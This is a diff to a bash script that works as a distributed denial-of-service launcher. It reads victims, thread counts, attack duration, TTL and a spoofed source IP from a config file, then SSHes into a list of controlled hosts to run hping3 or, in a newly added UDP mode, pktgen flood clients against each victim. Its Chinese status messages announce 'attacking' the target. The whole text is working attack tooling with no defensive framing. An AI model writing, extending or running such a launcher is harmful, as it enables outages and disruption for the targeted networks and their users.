@@ -8,7 +8,7 @@ then
 fi
 
 tcnt=$(wc -l $1|awk '{print $1}')
-if [ 12 -gt $tcnt ]
+if [ 14 -gt $tcnt ]
 then
 	echo -e "未设置目标.\n"
 	exit
@@ -16,16 +16,17 @@ fi
 
 declare -a HOSTS=($(cat hosts.txt))
 cnt=${#HOSTS[@]}
-thread=$(sed -n "2p" $1|awk '{print $2}')
-attack_time=$(sed -n "4p" $1|awk '{print $2}')
-wait_time=$(sed -n "6p" $1|awk '{print $2}')
-source_ip=$(sed -n "8p" $1|awk '{print $2}')
-ttl=$(sed -n "10p" $1|awk '{print $2}')
-victim=$(sed -n "12p" $1|awk '{print $0}')
+mode=$(sed -n "2p" $1|awk '{print $2}')
+thread=$(sed -n "4p" $1|awk '{print $2}')
+attack_time=$(sed -n "6p" $1|awk '{print $2}')
+wait_time=$(sed -n "8p" $1|awk '{print $2}')
+source_ip=$(sed -n "10p" $1|awk '{print $2}')
+ttl=$(sed -n "12p" $1|awk '{print $2}')
+victim=$(sed -n "14p" $1|awk '{print $0}')
 
 #echo $1 $thread $attack_time $wait_time $source_ip $ttl $victim
 
-for i in $(seq 12 1 $tcnt)
+for i in $(seq 14 1 $tcnt)
 do
 	victim=$(sed -n "$i {p;q;}" $1|awk '{print $0}')
         nc -z -w $wait_time $victim
@@ -34,11 +35,17 @@ do
 		for ((k=0;k<cnt;k++))
 		do
 			echo -e "正在攻击 $victim\n"
-    			ssh ${HOSTS[k]} hping3-client $victim $attack_time $ttl $thread $source_ip &
+			if [ $mode = "udp" ]
+			then
+    				ssh ${HOSTS[k]} pktgen-client $victim $attack_time $ttl $thread $source_ip &
+			else
+    				ssh ${HOSTS[k]} hping3-client $victim $attack_time $ttl $thread $source_ip &
 #    			echo "ssh ${HOSTS[k]} hping3-client $victim $attack_time $ttl $thread $source_ip &"
+			fi
 		done
 	else
-		echo -e "$victim 端口未开放或者被防火墙屏蔽.\n"
+		echo -e "\n$victim 端口未开放或者被防火墙屏蔽.\n"
 
         fi
+	sleep $(($attack_time+3))
 done
